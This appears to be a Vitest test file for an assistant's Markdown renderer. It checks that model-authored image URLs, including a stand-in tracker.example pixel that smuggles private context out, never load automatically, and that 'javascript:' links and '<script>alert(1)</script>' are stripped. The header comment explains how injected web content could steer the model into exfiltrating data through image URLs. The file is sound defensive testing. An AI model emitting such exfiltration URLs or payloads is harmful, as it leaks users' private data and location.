// @vitest-environment jsdom
import type { AssistantSource } from "@tendnote/domain/assistant-sources";
import { expect, it } from "vitest";
import { MessageResponse } from "@/components/ai-elements/message";
import { AssistantMarkdown } from "@/components/assistant-markdown";
import { cleanup, render, screen, userEvent, waitFor, within } from "@/test/dom";

/**
 * Model-authored Markdown must not reach the network on its own.
 *
 * A rendered `<img src>` fetches the moment the response paints - no click, no
 * confirmation - so an image URL in Eve's output is an egress channel: it discloses
 * the reader's IP and reading time, and a URL carrying private context in its path
 * or query exfiltrates that context outright. `web_fetch` puts untrusted third-party
 * prose inside the same turn as private-data tools, so this cannot rest on Eve not
 * emitting one.
 *
 * These tests assert the absence of an element, which is exactly the kind of thing a
 * renderer upgrade silently reintroduces.
 */

/** Every `<img>` the renderer produced, however the Markdown asked for it. */
function images(container: HTMLElement): HTMLImageElement[] {
  return [...container.querySelectorAll("img")];
}

it("renders a Markdown image as a link, never as an <img>", () => {
  const { container } = render(
    <AssistantMarkdown>
      {"Here it is: ![a teapot](https://tracker.example/pixel.png?ctx=mara-divorce)"}
    </AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  const link = screen.getByRole("link", { name: "a teapot" });
  expect(link.getAttribute("href")).toBe("https://tracker.example/pixel.png?ctx=mara-divorce");
  // No referrer, no window handle back: clicking is a deliberate act, and it is the
  // only thing that ever contacts that host.
  expect(link.getAttribute("rel")).toContain("noreferrer");
});

it("closes the raw-HTML route too, which the Markdown syntax shares", () => {
  const { container } = render(
    <AssistantMarkdown>
      {'Look: <img src="https://tracker.example/raw.png" alt="a raw one">'}
    </AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  expect(screen.getByRole("link", { name: "a raw one" })).toBeDefined();
});

it("still names an image that arrived with no alt text", () => {
  const { container } = render(
    <AssistantMarkdown>{"![](https://tracker.example/pixel.png)"}</AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  expect(screen.getByRole("link", { name: "Image" })).toBeDefined();
});

it("refuses to link a source the browser would interpret rather than fetch", () => {
  // Streamdown's own URL sanitizer already drops this one before our override sees
  // it; `safeImageHref` is the second lock, for a scheme it lets through. Either
  // way what matters is the pair of absences.
  const { container } = render(
    <AssistantMarkdown>{"![click me](javascript:alert(1))"}</AssistantMarkdown>,
  );

  expect(images(container)).toEqual([]);
  expect(screen.queryByRole("link")).toBeNull();
});

it("leaves ordinary prose alone", () => {
  const { container } = render(<AssistantMarkdown>{"Mara **adopted** a cat."}</AssistantMarkdown>);

  expect(container.querySelector('[data-streamdown="strong"]')?.textContent).toBe("adopted");
  expect(container.textContent).toBe("Mara adopted a cat.");
});

/**
 * Inline citations.
 *
 * A link whose target is a page the turn actually read gets a numbered marker
 * whose hover card names the page. Everything else about the link is untouched -
 * in particular Streamdown's link safety, which renders a Markdown link as a
 * button that discloses its destination before opening it. That confirmation is
 * the protection on a surface whose prose is model-authored, so these tests
 * assert it survives the citation treatment rather than being replaced by a
 * plain anchor.
 */

const RECIPE: AssistantSource = {
  publishedAt: "2026-03-14T00:00:00.000Z",
  title: "How to keep a sourdough starter",
  url: "https://bakery.example/starter",
};

const CLIMATE: AssistantSource = {
  title: "Flour prices in 2026",
  url: "https://grain.example/prices",
};

/** The marker for the nth source, by the accessible name it carries. */
function marker(index: number): HTMLElement {
  return screen.getByLabelText(new RegExp(`^Source ${index}:`));
}

it("numbers a link whose target is a source the turn read", async () => {
  render(
    <AssistantMarkdown sources={[RECIPE]}>
      {"Feed it daily, [says the bakery](https://bakery.example/starter)."}
    </AssistantMarkdown>,
  );

  const badge = marker(1);
  expect(badge.textContent).toBe("1");
  expect(badge.getAttribute("aria-label")).toBe(
    "Source 1: How to keep a sourdough starter (bakery.example)",
  );

  await userEvent.hover(badge);

  const card = await screen.findByText("How to keep a sourdough starter");
  const body = card.closest("[data-slot='hover-card-content']");
  expect(body).not.toBeNull();
  expect(within(body as HTMLElement).getByText("https://bakery.example/starter")).toBeDefined();
  expect(within(body as HTMLElement).getByText("bakery.example")).toBeDefined();
  expect(within(body as HTMLElement).getByText("Mar 14, 2026")).toBeDefined();
});

it("keeps the link itself on Streamdown's click-to-confirm treatment", () => {
  const { container } = render(
    <AssistantMarkdown sources={[RECIPE]}>
      {"Feed it daily, [says the bakery](https://bakery.example/starter)."}
    </AssistantMarkdown>,
  );

  // The citation adds a marker beside the link; it does not turn the link into a
  // bare anchor that navigates on click with no confirmation.
  const link = container.querySelector('[data-streamdown="link"]');
  expect(link?.tagName).toBe("BUTTON");
  expect(link?.textContent).toBe("says the bakery");
  expect(container.querySelectorAll("a")).toHaveLength(0);
});

it("opens the card from the keyboard", async () => {
  render(
    <AssistantMarkdown sources={[RECIPE]}>
      {"Feed it daily, [says the bakery](https://bakery.example/starter)."}
    </AssistantMarkdown>,
  );

  const badge = marker(1);
  badge.focus();
  expect(document.activeElement).toBe(badge);

  await waitFor(() => {
    expect(screen.getByText("How to keep a sourdough starter")).toBeDefined();
  });
});

it("gives every link to one source the same number, and each new source the next", () => {
  render(
    <AssistantMarkdown sources={[RECIPE, CLIMATE]}>
      {[
        "Feed it [daily](https://bakery.example/starter/) and watch",
        "[the flour price](https://grain.example/prices?utm_source=news), which the",
        "[same bakery page](https://bakery.example/starter#feeding) also covers.",
      ].join(" ")}
    </AssistantMarkdown>,
  );

  // Trailing slash, hash and tracking query are noise: the same page is the same
  // citation, and it keeps the number it was given the first time.
  expect(screen.getAllByLabelText(/^Source 1:/)).toHaveLength(2);
  expect(marker(2).textContent).toBe("2");
  expect(screen.queryByLabelText(/^Source 3:/)).toBeNull();
});

it("leaves a link that cites nothing exactly as it was", () => {
  const { container } = render(
    <AssistantMarkdown sources={[RECIPE]}>
      {"See [some other page](https://elsewhere.example/post)."}
    </AssistantMarkdown>,
  );

  expect(screen.queryByLabelText(/^Source /)).toBeNull();
  const link = container.querySelector('[data-streamdown="link"]');
  expect(link?.textContent).toBe("some other page");
  // No wrapper element either: an uncited link renders the markup it always did.
  expect(link?.parentElement?.tagName).toBe("P");
});

it("renders no citations at all when the turn read nothing", () => {
  render(
    <AssistantMarkdown>{"See [the page](https://bakery.example/starter)."}</AssistantMarkdown>,
  );

  expect(screen.queryByLabelText(/^Source /)).toBeNull();
});

it("leaves Streamdown's own rehype pass, and its sanitizer, exactly as it found it", () => {
  // Citations arrive as a rehype pass, and Streamdown *replaces* its default
  // plugin list when one is given rather than extending it - so the default has
  // to be spread back in by hand. If a Streamdown upgrade ever moved a plugin
  // out of the `defaultRehypePlugins` export it publishes, that hand-assembled
  // list would quietly lose it, and the one that matters here is the sanitizer
  // standing between model-authored HTML and the DOM.
  const markdown = [
    "Math: $E = mc^2$",
    "",
    "| a | b |",
    "| - | - |",
    "| 1 | 2 |",
    "",
    "<span class='raw'>raw html</span>",
    "",
    "<script>alert(1)</script>",
    "",
    "> quote **bold** and a [link](https://elsewhere.example/post)",
  ].join("\n");

  const streamdown = render(<MessageResponse>{markdown}</MessageResponse>).container.innerHTML;
  cleanup();
  const guarded = render(<AssistantMarkdown>{markdown}</AssistantMarkdown>).container.innerHTML;

  expect(guarded).toBe(streamdown);
  expect(guarded).toContain("raw html");
  expect(guarded).not.toContain("alert(1)");
});
